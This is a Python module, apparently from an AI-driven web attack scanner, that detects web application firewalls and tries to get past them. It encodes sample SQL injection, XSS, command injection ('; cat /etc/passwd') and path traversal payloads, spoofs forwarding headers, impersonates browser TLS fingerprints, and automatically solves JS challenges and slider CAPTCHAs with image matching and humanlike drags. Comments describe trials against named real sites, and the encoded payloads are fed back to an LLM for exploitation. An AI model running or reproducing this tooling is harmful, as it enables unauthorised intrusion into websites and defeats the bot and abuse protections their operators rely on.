#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF / IPS Evasion Engine -- payload encoding and bypass techniques inspired by
Acunetix sensor-bridge evasion capabilities.

Detects WAF (via waf_detector.py / acusensor_sensor.py) then applies
evasion techniques when the WAF is actively blocking requests.

Techniques:
  - Payload encoding (URL, hex, UTF-8, double-URL, HTML entity, null-byte)
  - HTTP parameter pollution (split single param into multiple sub-params)
  - Header manipulation to bypass WAF rule triggers
  - Case randomization for pattern-matching WAFs

Usage:
    from scanners.waf_bypass import WAFEvasionEngine, detect_waf_and_encode

    engine = WAFEvasionEngine()
    encoded = engine.encode_payload("1 OR 1=1", technique='double_url')
    results = detect_waf_and_encode(url, "sqli")
"""

import base64
import html as html_module
import json
import logging
import random
import re
import time
import urllib.parse
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger('waf_bypass')


class EvasionTechnique(str, Enum):
    """Available evasion techniques."""
    NONE = 'none'
    URL_ENCODE = 'url_encode'
    DOUBLE_URL_ENCODE = 'double_url_encode'
    HEX_ENCODE = 'hex_encode'
    UTF8_UNICODE = 'utf8_unicode'
    HTML_ENTITY = 'html_entity'
    CASE_RANDOMIZE = 'case_randomize'
    NULL_BYTE = 'null_byte_insert'
    PARAM_SPLIT = 'param_split'


# ====================================================================
# Evasion engine
# ====================================================================

class WAFEvasionEngine:
    """Multi-technique WAF/IPS payload evasion engine."""

    TRIGGER_CHARS = re.compile(r"""['"\\;`|&<>\$\(\)\{\}\[\]!@#$%^*]""")

    def __init__(self, min_evasion_threshold: int = 3):
        self._threshold = min_evasion_threshold
        self._active_waf_probes: int = 0
        self._blocked_count: int = 0

    def detect_evasion_needed(self, responses: List[Tuple[str, int]]) -> bool:
        """Check if enough WAF probes were blocked to warrant evasion."""
        blocked = sum(1 for _, status in responses if status in (403, 406, 501, 503))
        return len(responses) >= self._threshold and blocked >= self._threshold

    def encode_payload(self, payload: str, technique: EvasionTechnique = EvasionTechnique.URL_ENCODE) -> Any:
        """Encode a single payload using the specified evasion technique."""
        if technique == EvasionTechnique.PARAM_SPLIT:
            return self._param_split(payload)
        encoders = {
            EvasionTechnique.NONE: lambda s: s,
            EvasionTechnique.URL_ENCODE: urllib.parse.quote,
            EvasionTechnique.DOUBLE_URL_ENCODE: lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe=''),
            EvasionTechnique.HEX_ENCODE: lambda s: '%'.join(f'0x{ord(c):02X}' for c in s),
            EvasionTechnique.UTF8_UNICODE: self._utf8_unicode,
            EvasionTechnique.HTML_ENTITY: html_module.escape,
            EvasionTechnique.CASE_RANDOMIZE: self._case_randomize,
            EvasionTechnique.NULL_BYTE: self._null_byte_insert,
        }
        encoder = encoders.get(technique, lambda s: s)
        return encoder(payload)

    def encode_url(self, url: str, technique: EvasionTechnique = EvasionTechnique.URL_ENCODE) -> str:
        """Encode query parameters in a URL."""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return url
        params = dict(urllib.parse.parse_qsl(parsed.query))
        encoded_params: Dict[str, str] = {}
        for k, v in params.items():
            encoded_params[self._encode_component(k, technique)] = self._encode_component(v, technique)
        new_query = urllib.parse.urlencode(encoded_params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def encode_header_value(self, value: str, technique: EvasionTechnique = EvasionTechnique.HEX_ENCODE) -> str:
        """Encode an HTTP header value to bypass string-matching WAF rules."""
        if technique == EvasionTechnique.NULL_BYTE:
            return ''.join(c + '\x00' for c in value)
        encoders = {
            EvasionTechnique.HEX_ENCODE: lambda s: '%'.join(f'0x{ord(c):02X}' for c in s),
            EvasionTechnique.URL_ENCODE: urllib.parse.quote,
            EvasionTechnique.CASE_RANDOMIZE: self._case_randomize,
        }
        return encoders.get(technique, lambda s: s)(value)

    def generate_evasion_headers(self, original_headers: Dict[str, str]) -> List[Dict[str, str]]:
        """Generate multiple header variations to bypass WAF header-filtering rules."""
        variants: List[Dict[str, str]] = []

        # Variant 1: X-Forwarded-For shift
        v1 = dict(original_headers)
        if 'X-Forwarded-For' not in v1:
            v1['X-Forwarded-For'] = '127.0.0.1'
        variants.append(v1)

        # Variant 2: Header name case randomization
        v2: Dict[str, str] = {}
        for k, v in original_headers.items():
            if 'Host' in k or 'User-Agent' in k:
                v2[k] = v
                continue
            randomized = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in k)
            v2[randomized] = v
        variants.append(v2)

        # Variant 3: Multiple X-Forwarded headers
        v3 = dict(original_headers)
        for i in range(3):
            v3[f'X-Forwarded-For-{i}'] = f'10.{i}.{i}.{i}'
        variants.append(v3)

        # Variant 4: Duplicate trusted header names
        v4 = dict(original_headers)
        v4['X-Real-IP'] = '192.168.1.1'
        v4['X-Cluster-Client-IP'] = '10.0.0.1'
        variants.append(v4)

        return variants

    def get_all_techniques(self) -> List[EvasionTechnique]:
        """Return all available evasion techniques (excluding NONE)."""
        return [t for t in EvasionTechnique if t != EvasionTechnique.NONE]

    # -- internal helpers ---------------------------------------------------

    @staticmethod
    def _utf8_unicode(s: str) -> str:
        return ''.join(f'\\u{ord(c):04X}' if ord(c) < 128 else c for c in s)

    @staticmethod
    def _case_randomize(s: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def _null_byte_insert(s: str) -> str:
        result: List[str] = []
        for c in s:
            result.append(c)
            if re.match(r"""['"\\;`|&<>\$\(\)\{\}\[\]]""", c):
                result.append('\x00')
        return ''.join(result)

    def _param_split(self, payload: str) -> Dict[str, str]:
        """Split a single parameter value into multiple sub-parameters."""
        parts = re.split(r'(\s+)', payload)
        result: Dict[str, str] = {}
        for i, part in enumerate(parts):
            if part and not part.isspace():
                key = f'id[{i}]' if i > 0 else 'id'
                result[key] = part
        return result

    def _encode_component(self, component: str, technique: EvasionTechnique) -> str:
        """Encode a URL query parameter component."""
        if technique == EvasionTechnique.NONE:
            return component
        if technique == EvasionTechnique.URL_ENCODE:
            return urllib.parse.quote(component, safe='')
        if technique == EvasionTechnique.DOUBLE_URL_ENCODE:
            return urllib.parse.quote(urllib.parse.quote(component, safe=''), safe='')
        if technique == EvasionTechnique.HEX_ENCODE:
            return '%'.join(f'0x{ord(ch):02X}' for ch in component)
        # 兜底：普通 URL 编码
        return urllib.parse.quote(component, safe='')


# ====================================================================
# Convenience function
# ====================================================================

def detect_waf_and_encode(url: str, payload_type: str) -> Dict[str, Any]:
    """Quick WAF detection + evasion test. Returns encoded payloads for each technique."""
    result = {'url': url, 'techniques_tested': [], 'encoded_payloads': {}}

    try:
        from scanners.waf_detector import detect_waf as _detect_waf
        waf_result = _detect_waf(url)
        if waf_result.get('wafs_detected'):
            logger.info('WAF detected for %s: %s', url, waf_result['wafs_detected'])
    except Exception:
        pass

    engine = WAFEvasionEngine()
    sample_payloads = {
        'sqli': "1' OR '1'='1",
        'xss': '<script>alert(1)</script>',
        'rce': '; cat /etc/passwd',
        'lfi': '../../../../etc/passwd',
    }
    payload = sample_payloads.get(payload_type, payload_type)

    for tech in engine.get_all_techniques():
        encoded = engine.encode_payload(payload, tech)
        if isinstance(encoded, dict):
            result['encoded_payloads'][tech.value] = encoded
        else:
            result['encoded_payloads'][tech.value] = encoded
        result['techniques_tested'].append(tech.value)

    return result


# ====================================================================
# Adaptive evasion probe — 供 LLM 自适应模式（run_adaptive / waf_evasion 工具）调用
# ====================================================================

# 响应体里出现即判定"被 WAF/风控吃了"的标记（小写子串，取前 4000 字符匹配）。
WAF_CHALLENGE_MARKERS = [
    "cf-chl", "challenge-platform", "just a moment", "checking your browser",
    "captcha", "recaptcha", "hcaptcha", "turnstile",
    # 阿里云 / 抖音系风控签名参数
    "a_bogus", "x-bogus", "_abck", "acw_sc__v2", "acw_tc", "waf_block",
    "request blocked", "blocked by waf", "access denied",
]

# HTTP 状态码里视为"被拦"的集合。（418：豆瓣等站点用它做 bot 检测，真实目标实证）
BLOCK_STATUSES = (403, 406, 418, 501, 503)

# 各漏洞类型的样例 payload（evasion_probe 在未显式给 payload 时使用）。
SAMPLE_PAYLOADS = {
    'sqli': "1' OR '1'='1",
    'xss': '<script>alert(1)</script>',
    'rce': '; cat /etc/passwd',
    'lfi': '../../../../etc/passwd',
}


def _get_http_client(impersonate: bool = True):
    """返回 (client_name, client_module)。

    优先 curl_cffi（可 impersonate Chrome/Safari 的完整 TLS/HTTP2 指纹，
    骗过 JA3/JA4 类指纹 WAF）；未安装则降级到裸 requests。
    """
    if impersonate:
        try:
            from curl_cffi import requests as _cffi_req
            return ("curl_cffi", _cffi_req)
        except Exception:
            pass
    import requests as _std_req
    return ("requests", _std_req)


def _looks_blocked(status: int, text: str) -> bool:
    """判定一次响应是否被 WAF/风控拦截（状态码或挑战标记）。"""
    if status in BLOCK_STATUSES:
        return True
    low = (text or "").lower()[:4000]
    return any(m in low for m in WAF_CHALLENGE_MARKERS)


# 滑块验证码按钮选择器（百度 BIOC / Geetest / 腾讯 TCaptcha / 阿里云）——solve_js_challenge
# 在纯 JS 执行未放行时做 best-effort 拖动。真实目标实证：tieba.baidu.com = passMod_slide-btn。
SLIDER_BUTTON_SELECTORS = [
    "div.passMod_slide-btn",            # 百度 BIOC（贴吧等，2026-10-21 真实 DOM 确认）
    ".geetest_slider_button",           # Geetest v3
    "#tcaptcha_drag_button",            # 腾讯 TCaptcha
    "#aliyunCaptcha-sliding-slider",    # 阿里云滑块
]

# 对应轨道选择器（用来算最大拖动距离；找不到时回退 240px）
SLIDER_TRACK_SELECTORS = [
    "div.passMod_slide-control",        # 百度 BIOC
    ".geetest_slider",                  # Geetest v3
    "#aliyunCaptcha-sliding",           # 阿里云滑块
]


def _bioc_puzzle_match_once(page) -> Tuple[Optional[Dict[str, Any]], bool]:
    """单次 BIOC 拼图缺口匹配。Returns: (结果|None, 页面上是否存在拼图图对)。"""
    try:
        import cv2
        import numpy as np
    except Exception as e:
        logger.debug("bioc puzzle match: cv2/numpy unavailable: %s", e)
        return None, False

    info = page.evaluate("""() => {
        const bg = document.querySelector('img.passMod_puzzle-background');
        const blk = document.querySelector('img.passMod_puzzle-block');
        if (!bg || !blk) return null;
        const r = bg.getBoundingClientRect();
        return {bg_src: bg.src, block_src: blk.src, display_w: r.width};
    }""")
    if not info or not info.get("display_w"):
        logger.debug("bioc puzzle match: no passMod_puzzle img pair on page")
        return None, False

    # 图片服务器校验 Referer（passport.baidu.com 实测返回 "Unauthorized Host"）
    try:
        referer = page.url
        bg_body = page.request.get(info["bg_src"], headers={"Referer": referer}).body()
        blk_body = page.request.get(info["block_src"], headers={"Referer": referer}).body()
    except Exception as e:
        logger.debug("bioc puzzle match: image fetch failed: %s", e)
        return None, True

    try:
        bg = cv2.imdecode(np.frombuffer(bg_body, np.uint8), cv2.IMREAD_COLOR)
        blk = cv2.imdecode(np.frombuffer(blk_body, np.uint8), cv2.IMREAD_UNCHANGED)
    except Exception as e:
        logger.debug("bioc puzzle match: image decode failed: %s", e)
        return None, True
    if bg is None or blk is None or blk.ndim != 3 or blk.shape[2] < 4:
        logger.debug("bioc puzzle match: bad image shapes bg=%s blk=%s",
                     None if bg is None else bg.shape,
                     None if blk is None else blk.shape)
        return None, True

    # alpha 轮廓 = jigsaw 形状模板；面积占比异常（空/满）说明不是拼图块
    mask = (blk[:, :, 3] > 128).astype(np.uint8) * 255
    mh, mw = mask.shape
    frac = float(mask.sum()) / 255.0 / float(mh * mw)
    if not (0.01 < frac < 0.9):
        logger.debug("bioc puzzle match: alpha frac %.4f out of range", frac)
        return None, True

    # 两图分辨率不一致时把模板缩到背景高度（BIOC 实测两者同高，此为保险）
    if mh != bg.shape[0]:
        scale = bg.shape[0] / float(mh)
        mask = cv2.resize(mask, (max(8, int(round(mw * scale))), bg.shape[0]),
                          interpolation=cv2.INTER_AREA)

    edges_bg = cv2.Canny(cv2.cvtColor(bg, cv2.COLOR_BGR2GRAY), 50, 150)
    edges_blk = cv2.Canny(mask, 50, 150)
    if edges_blk.shape[0] > edges_bg.shape[0] or edges_blk.shape[1] >= edges_bg.shape[1]:
        logger.debug("bioc puzzle match: template %s not smaller than bg %s",
                     edges_blk.shape, edges_bg.shape)
        return None, True

    res = cv2.matchTemplate(edges_bg, edges_blk, cv2.TM_CCOEFF_NORMED)
    _, max_v, _, (tx, ty) = cv2.minMaxLoc(res)
    if float(max_v) < 0.2:
        logger.debug("bioc puzzle match: peak score %.4f < 0.2 at x=%s", float(max_v), tx)
        return None, True
    # 抑制峰值邻域后找次优：分离度不足说明没有可信的局部最优（可能是平坦噪声峰）
    res_rest = res.copy()
    res_rest[max(0, ty - 15):ty + 16, max(0, tx - 25):tx + 26] = -1.0
    _, second_v, _, _ = cv2.minMaxLoc(res_rest)
    if float(max_v) - float(second_v) < 0.04:
        logger.debug("bioc puzzle match: separation %.4f < 0.04 (peak %.4f)",
                     float(max_v) - float(second_v), float(max_v))
        return None, True

    # 图片像素 → 显示像素（拖动距离与滑块位移 1:1，轨道宽==背景图显示宽）
    distance = int(tx) * (float(info["display_w"]) / float(bg.shape[1]))
    if not (20 <= distance <= info["display_w"]):
        logger.debug("bioc puzzle match: distance %.1f out of range", distance)
        return None, True
    logger.debug("bioc puzzle match OK: score=%.3f gap_x=%s distance=%.1f",
                 float(max_v), tx, distance)
    return {"method": "puzzle_edge_match", "score": round(float(max_v), 3),
            "gap_x_image": int(tx), "distance": round(distance, 1)}, True


def _click_bioc_refresh(page) -> bool:
    """点 BIOC 对话框的「刷新」链接换一张新拼图。

    class 是哈希名不稳定，按文本定位；链接文本可能带 ⟳ 图标字符，须用包含匹配而非全等。
    「刷新」链接实测不在 .passMod_dialog-wrapper 内（在对话框外层的页脚），且渲染有延迟，
    故轮询最多 ~4s：先查对话框、再查整页。
    """
    find_js = """() => {
        const findRefresh = (scope) => {
            for (const a of scope.querySelectorAll('a, button')) {
                const t = (a.innerText || '').replace(/\\s+/g, '');
                // 短文本才可能是刷新按钮；排除"网络不佳，请刷新重试"之类的长句提示
                if (t.length <= 8 && t.includes('刷新')) return a;
            }
            return null;
        };
        let el = findRefresh(document.querySelector('.passMod_dialog-wrapper') || document);
        if (!el) el = findRefresh(document);
        return el;
    }"""
    for _ in range(6):
        try:
            handle = page.evaluate_handle(find_js)
            el = handle.as_element() if handle is not None else None
            if el is not None:
                el.click()
                return True
        except Exception:
            pass
        try:
            page.wait_for_timeout(700)
        except Exception:
            break
    return False


def _wait_for_bioc_imgs(page, timeout_ms: int = 12000) -> bool:
    """轮询等待 BIOC 拼图图对（passMod_puzzle-background/block）渲染出来。"""
    deadline = time.monotonic() + timeout_ms / 1000.0
    while True:
        try:
            if page.evaluate(
                    "() => !!(document.querySelector('img.passMod_puzzle-background') &&"
                    " document.querySelector('img.passMod_puzzle-block'))"):
                return True
        except Exception:
            pass
        if time.monotonic() >= deadline:
            return False
        try:
            page.wait_for_timeout(750)
        except Exception:
            break


def _find_puzzle_gap_drag(page, max_refreshes: int = 2) -> Optional[Dict[str, Any]]:
    """拼图缺口型滑块（百度 BIOC p_puzzle）：模板匹配定位缺口，返回应拖动的显示像素距离。

    原理：BIOC 的 passMod_puzzle-block 是带 alpha 通道的 jigsaw 形状图，背景图上对应位置
    有同形状的白色描边缺口。对两者做 Canny 边缘 + matchTemplate（TM_CCOEFF_NORMED），
    峰值 x 即缺口位置；图片像素按显示宽度等比换算成拖动距离（轨道宽==图片显示宽，1:1）。

    置信门：峰值需 >=0.2 且与"远离峰值区的全局次优"分离度 >=0.04。不同随机图的可检测性
    差异大（实测 score 0.34~0.53），过不了门就点「刷新」换图重试，最多 max_refreshes 次；
    仍失败返回 None（调用方回退全宽拖动）。cv2/numpy 缺失或图片无 alpha 轮廓时同样 None。
    """
    reloaded = False
    for attempt in range(max_refreshes + 1):
        result, had_imgs = _bioc_puzzle_match_once(page)
        if result is not None:
            result["refreshes"] = attempt
            result["reloaded"] = reloaded
            return result
        if not had_imgs:
            # 拼图图对还没渲染出来（BIOC 图片异步加载）→ 短等重试；
            # reload 后仍无图对说明这次不质询，直接返回由 solve_js_challenge 复判处理。
            if attempt < max_refreshes and not reloaded:
                logger.debug("bioc puzzle match: no img pair yet, waiting")
                try:
                    page.wait_for_timeout(2500)
                except Exception:
                    pass
                continue
            logger.debug("bioc puzzle match: giving up (no img pair)")
            return None
        if attempt < max_refreshes:
            if _click_bioc_refresh(page):
                logger.debug("bioc puzzle match: gate failed, clicked refresh for new image")
                try:
                    page.wait_for_timeout(2500)
                except Exception:
                    pass
            else:
                # 刷新链接缺失（BIOC 页脚异步渲染/页面变体）→ 整页 reload 拿全新挑战。
                # reload 可能直接不再质询（200），由 solve_js_challenge 的复判处理。
                logger.debug("bioc puzzle match: no refresh link, reloading page")
                try:
                    page.reload(wait_until="domcontentloaded", timeout=35000)
                    reloaded = True
                    _wait_for_bioc_imgs(page)  # BIOC 渲染实测 ~6-9s，轮询最多 12s
                except Exception as e:
                    logger.debug("bioc puzzle match: reload failed: %s", e)
    logger.debug("bioc puzzle match: giving up after %d attempts", max_refreshes + 1)
    return None


def _try_slider_drag(page) -> Dict[str, Any]:
    """best-effort 拖动页面上的已知厂商滑块按钮（人类化轨迹：ease-out + 抖动）。

    Returns:
        {"attempted": bool, "selector"?, "distance"?} —— attempted=False 表示页面没找到已知滑块。
    """
    # BIOC/其他厂商对话框可能仍在渲染，轮询最多 ~6s 直到出现可见的滑块按钮
    el = box = None
    sel_used = None
    for _ in range(8):
        for sel in SLIDER_BUTTON_SELECTORS:
            try:
                cand = page.query_selector(sel)
            except Exception:
                continue
            if cand is None:
                continue
            try:
                if not cand.is_visible():
                    continue
                b = cand.bounding_box()
            except Exception:
                continue
            if b and b.get("width", 0) >= 5:
                el, box, sel_used = cand, b, sel
                break
        if el is not None:
            break
        try:
            page.wait_for_timeout(750)
        except Exception:
            pass
    if el is None or box is None:
        return {"attempted": False}

    # 拖动距离：优先拼图缺口型模板匹配（BIOC p_puzzle 实证），失败回退全宽
    distance = None
    meta: Dict[str, Any] = {}
    try:
        puzzle = _find_puzzle_gap_drag(page)
    except Exception:
        puzzle = None
    if puzzle is not None:
        distance = float(puzzle["distance"])
        meta = {k: v for k, v in puzzle.items() if k != "distance"}
    else:
        # 滑到底型：按轨道宽度算全宽（拼图缺口型匹配失败时可能拖过头，属已知边界）
        for tsel in SLIDER_TRACK_SELECTORS:
            try:
                track = page.query_selector(tsel)
                if track is not None:
                    tbox = track.bounding_box()
                    if tbox and tbox.get("width", 0) > box["width"]:
                        distance = max(60.0, tbox["width"] - box["width"])
                        break
            except Exception:
                continue
        if distance is None:
            distance = 240.0

    # 拼图匹配可能触发过整页 reload，el/box 句柄会失效 → 拖动前重新取坐标
    try:
        fresh = page.query_selector(sel_used)
        if fresh is not None:
            fb = fresh.bounding_box()
            if fb and fb.get("width", 0) >= 5:
                el, box = fresh, fb
    except Exception:
        pass

    sx = box["x"] + box["width"] / 2.0
    sy = box["y"] + box["height"] / 2.0
    try:
        page.mouse.move(sx, sy)
        page.wait_for_timeout(150)
        page.mouse.down()
        steps = 32
        for i in range(1, steps + 1):
            t = i / steps
            eased = 1.0 - (1.0 - t) ** 3  # ease-out：快起慢收，接近人手
            x = sx + distance * eased + random.uniform(-1.2, 1.2)
            y = sy + random.uniform(-2.0, 2.0)
            page.mouse.move(x, y)
            page.wait_for_timeout(random.randint(6, 22))
        page.wait_for_timeout(120)
        page.mouse.up()
    except Exception as e:
        return {"attempted": True, "selector": sel_used, "distance": round(distance, 1),
                **meta, "error": f"{type(e).__name__}: {str(e)[:120]}"}
    return {"attempted": True, "selector": sel_used, "distance": round(distance, 1), **meta}


def solve_js_challenge(url: str, timeout: int = 25) -> Dict[str, Any]:
    """用 headless Chromium 跑一遍 JS 挑战，抓回 clearance cookie + 最终状态。

    对付 Cloudflare / Akamai / 抖音这类"发一段混淆 JS、算出签名 cookie 才放行"的 WAF：
    让真实浏览器内核执行那段 JS，把算出来的 cookie（cf_clearance / acw_tc 等）抓回来，
    后续请求带上即可过。纯 JS 未放行时再 best-effort 拖一次已知厂商滑块验证码
    （百度 BIOC / Geetest / 腾讯 TCaptcha / 阿里云）。拼图缺口型（BIOC p_puzzle）会先做
    Canny+matchTemplate 边缘模板匹配定位缺口（需 cv2/numpy，缺失则回退全宽拖动）。

    Returns:
        {"ok", "url", "status", "final_url", "title", "solved", "cookies": {name:value},
         "slider": {...}|None, "error"}
    """
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    out: Dict[str, Any] = {
        "ok": False, "url": url, "status": None, "final_url": None,
        "title": None, "solved": False, "cookies": {}, "error": "",
    }
    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:  # pragma: no cover - 依赖缺失
        out["error"] = f"playwright unavailable: {e}"
        return out

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"),
            )
            page = context.new_page()
            resp = page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)
            # 给挑战 JS 时间执行 + 落 cookie
            try:
                page.wait_for_load_state("networkidle", timeout=8000)
            except Exception:
                pass
            page.wait_for_timeout(2500)

            out["status"] = resp.status if resp is not None else None
            out["final_url"] = page.url
            try:
                out["title"] = page.title()
            except Exception:
                pass
            out["cookies"] = {c["name"]: c["value"] for c in context.cookies()}

            def _judge() -> None:
                body_low = (page.content() or "").lower()[:4000]
                out["solved"] = bool(
                    out.get("status") == 200 and not any(m in body_low for m in WAF_CHALLENGE_MARKERS)
                )

            _judge()

            # 纯 JS 未放行 → best-effort 滑块验证码拖动（BIOC/Geetest/TCaptcha/阿里云）
            if not out["solved"]:
                drag = _try_slider_drag(page)
                out["slider"] = drag
                if drag.get("attempted"):
                    # 等验证结果 + 自动跳回 backurl，再从 navigation entries 刷新状态码
                    page.wait_for_timeout(3000)
                    try:
                        st = page.evaluate(
                            "() => { const e = performance.getEntriesByType('navigation');"
                            " return e.length ? Number(e[e.length - 1].responseStatus || 0) : 0; }")
                        if st and int(st) > 0:
                            out["status"] = int(st)
                    except Exception:
                        pass
                    try:
                        out["final_url"] = page.url
                    except Exception:
                        pass
                    try:
                        out["title"] = page.title()
                    except Exception:
                        pass
                    out["cookies"] = {c["name"]: c["value"] for c in context.cookies()}
                    _judge()

            browser.close()
        out["ok"] = True
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {str(e)[:200]}"
    return out


def evasion_probe(
    url: str,
    payload: str = "",
    vuln_type: str = "sqli",
    techniques: Optional[List[str]] = None,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    body: Optional[str] = None,
    impersonate: bool = True,
    solve_js: bool = False,
    timeout: int = 15,
) -> Dict[str, Any]:
    """检测 WAF + 逐技术重探，报告哪种规避"过了"。

    流程：
      1. baseline 探测（curl_cffi 指纹优先），记录状态/是否被拦；
      2. 若未被拦 → 直接返回 best_technique=None（无需规避）；
      3. 被拦 → 跑 waf_detector 命名 WAF，然后对每种编码技术把 URL query 重新编码后重探，
         判定哪种让响应"不再像被 WAF 吃了"（状态脱离拦截集 + 无挑战标记）；
      4. solve_js=True 时额外用 playwright 跑 JS 挑战抓 clearance cookie 再重探一次。

    Returns:
        {
          "url", "wafs_detected": [...], "client": "curl_cffi"|"requests",
          "baseline": {"status","blocked","body_len"},
          "results": [ {"technique","status","got_through","note"} ... ],
          "best_technique": str|None,
          "encoded_payloads": {tech: encoded}   # 供 LLM 回灌 http_probe/exploit
          "js_challenge": {...}|None,
        }
    """
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    method = (method or "GET").upper()
    headers = dict(headers or {})

    client_name, client = _get_http_client(impersonate)
    engine = WAFEvasionEngine()

    def _do_request(req_url: str, req_headers: Dict[str, str], req_body: Optional[str]) -> Dict[str, Any]:
        try:
            r = client.request(method, req_url, headers=req_headers, data=req_body,
                               allow_redirects=True, timeout=timeout)
            text = r.text or ""
            return {"status": r.status_code, "body_len": len(r.content),
                    "blocked": _looks_blocked(r.status_code, text),
                    "excerpt": text[:300]}
        except Exception as e:
            return {"status": None, "body_len": 0, "blocked": False,
                    "error": f"{type(e).__name__}: {str(e)[:160]}"}

    result: Dict[str, Any] = {
        "url": url, "client": client_name, "wafs_detected": [],
        "baseline": {}, "results": [], "best_technique": None,
        "encoded_payloads": {}, "js_challenge": None,
    }

    # 1. baseline
    base = _do_request(url, headers, body)
    result["baseline"] = {k: v for k, v in base.items() if k != "excerpt"}
    if base.get("status") is None:
        # 连接层失败（DNS/TLS/超时）——不是"WAF 放行"，别误导 LLM
        result["note"] = (f"baseline request failed ({base.get('error', 'connection error')}) — "
                          "target may be down, or TLS fingerprint rejected; try impersonate=true / solve_js=true")
        return result
    if not base.get("blocked"):
        result["note"] = f"baseline status {base.get('status')} not blocked — no evasion needed"
        return result

    # 2. 命名 WAF（仅在被拦时跑，省干净目标的探测开销）
    try:
        from scanners.waf_detector import detect_waf as _detect_waf
        waf_res = _detect_waf(url, timeout=min(timeout, 15))
        result["wafs_detected"] = waf_res.get("wafs_detected") or []
    except Exception as e:
        result["waf_detect_error"] = str(e)[:160]

    # 3. 逐技术重探（对 URL query 重新编码）
    techs = [EvasionTechnique(t) for t in techniques] if techniques else engine.get_all_techniques()
    has_query = bool(urllib.parse.urlparse(url).query)
    sample_payload = payload or SAMPLE_PAYLOADS.get(vuln_type, "")

    for tech in techs:
        entry: Dict[str, Any] = {"technique": tech.value}
        # 编码 URL query（无 query 时该技术对 URL 无效，但仍记录）
        try:
            enc_url = engine.encode_url(url, tech) if has_query else url
        except Exception as e:
            entry["note"] = f"encode failed: {str(e)[:120]}"
            result["results"].append(entry)
            continue
        # 若给了独立 payload，也产出其编码变体供 LLM 回灌
        if sample_payload:
            try:
                enc_pl = engine.encode_payload(sample_payload, tech)
                result["encoded_payloads"][tech.value] = (
                    enc_pl if isinstance(enc_pl, str) else json.dumps(enc_pl, ensure_ascii=False))
            except Exception:
                pass

        probe = _do_request(enc_url, headers, body)
        entry.update({k: v for k, v in probe.items() if k != "excerpt"})
        got_through = (not probe.get("blocked")) and (probe.get("status") is not None)
        entry["got_through"] = bool(got_through)
        if has_query and enc_url == url:
            entry["note"] = "no query params to encode — technique had no effect on URL"
        elif got_through:
            entry["note"] = f"WAF bypassed with {tech.value} (status {probe.get('status')})"
        result["results"].append(entry)

        if got_through and result["best_technique"] is None:
            result["best_technique"] = tech.value

    # 4. JS 挑战（playwright）
    if solve_js:
        js = solve_js_challenge(url, timeout=timeout + 10)
        result["js_challenge"] = js
        if js.get("solved") and js.get("cookies"):
            cookie_hdr = "; ".join(f"{k}={v}" for k, v in js["cookies"].items() if k)
            merged = dict(headers)
            merged["Cookie"] = (merged.get("Cookie", "") + " " + cookie_hdr).strip()
            reprobe = _do_request(url, merged, body)
            result["js_challenge"]["reprobe_status"] = reprobe.get("status")
            if not reprobe.get("blocked"):
                result["best_technique"] = result["best_technique"] or "js_challenge_cookies"
            else:
                # 真实目标实证（2026-10-21 douban/163）：浏览器过了、cookie 也抓到了，
                # 但 cffi+cookie 仍被拦 → 封锁针对 TLS/HTTP2 指纹而非缺 cookie。
                result["js_challenge"]["reprobe_blocked_despite_cookies"] = True
                result["js_challenge"]["hint"] = (
                    "real browser passed and clearance cookies were captured, but curl_cffi+cookies is still blocked — "
                    "the WAF fingerprints TLS/HTTP2 rather than checking cookies. Keep using the browser for follow-up "
                    "requests, or retry http_probe with impersonate=false")

    return result
